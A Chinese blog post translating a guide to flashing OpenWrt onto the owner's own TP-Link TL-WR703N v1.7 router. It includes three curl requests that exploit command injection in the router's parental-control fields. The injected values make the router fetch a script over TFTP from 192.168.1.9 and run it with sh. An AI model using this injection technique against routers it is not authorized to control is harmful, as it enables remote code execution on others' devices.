layout: tl-wr703n
title: TL-WR703N v1.7 刷OpenWrt（译）
date: 2015-09-06 11:00:54
categories: Practice
tags: [OpenWrt,router,translation]
---
买了一台TP-Link wr703n准备刷OpenWrt用作开发，怎料官方挖了个大坑等我去跳——最新的官方固件封死网页刷机的渠道（据说是加了签名），又不会焊TTL的。。。幸好国外的大神已经给出了解决方案，亲测可行，替大家把原文翻译一下（有改动）。

<!--more-->

原文出处：[http://www.shadowandy.net/2015/03/flashing-tp-link-tl-wr703n-v1-7-to-openwrt.htm](http://www.shadowandy.net/2015/03/flashing-tp-link-tl-wr703n-v1-7-to-openwrt.htm)
## 翻译水平有限大家将就看看哈，刷坏概不负责。


### 获得必要的材料

将v1.7的TL-WR703N刷到OpenWrt，你需要：

1. 固件版本为3.17.1 Build 140120 Rel.56593n的TL-WR703N v1.7
2. OpenWrt为TL-WR703N定制的固件 [Download](http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin)
3. cURL以发送 crafted http 请求 [Download](http://curl.haxx.se/download.html)
4. dd 以拆分 OpenWrt 为 kernel 和 rootfs 镜像 [Download](http://www.chrysocome.net/dd)
5. TFTP 服务器（建议32位）[Download](http://tftpd32.jounin.net/)
6. 一个命令行脚本来指导路由器执行刷机.你需要一个编辑器 (e.g. Notepad++) 来创建一个Unix风格的脚本
7. busybox 1.16.1 for mips [Download](http://www.busybox.net/downloads/binaries/1.16.1/)

### 准备开发wr703n的材料

1. 拆分 OpenWrt 为 kernel 和 rootfs 镜像

		dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576
		dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576

2. 在你的电脑上设置局域网接口

命令行脚本(aa)是在和IP地址192.168.1.9沟通。你可以修改电脑的静态IP也可以修改命令行脚本里的地址，这取决于你！

### 开始刷机

1. 用必要的文件设置TFTP
现在你有以下四个文件：
	* aa
	* i1
	* i2
	* busybox
**解压并执行**TFTP服务器并且将操作根目录指向含有这四个文件的地方

2. 连接设备并且还原出厂设置（点击恢复出厂设置就好，不要干多余的事）

3. 执行开发并升级  
	在此之前，确认你电脑的静态IP为192.168.1.9

	1. 将你的在命令行下的操作目录指向含有cURL的地方
	2. 依次执行以下三条命令

			curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true" "http://192.168.1.1/"
			curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1"
			curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20192.168.1.9;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6"
判断命令是否执行成功：

	* 如果命令一成功，登陆密码被修改为"admin42"
	* 如果命令二成功，I can see the new parental item is added and enabled.(没看懂orz)
	* 但是如果命令三成功，看起来没有任何事情发生（命令三有些慢，请不要慌）

	备注：在过程中千万不要断开路由器的电源，否则你的路由器很有可能变砖！！！
4. 当路由器不再闪烁时，在浏览器输入192.168.1.1登陆Openwrt。
5. 享受你的 TL-WR703N v1.7 吧

这里是我刷机用过的工具和做好的材料，解压后使用——[度盘](http://pan.baidu.com/share/link?shareid=3048068689&uk=3694274917)
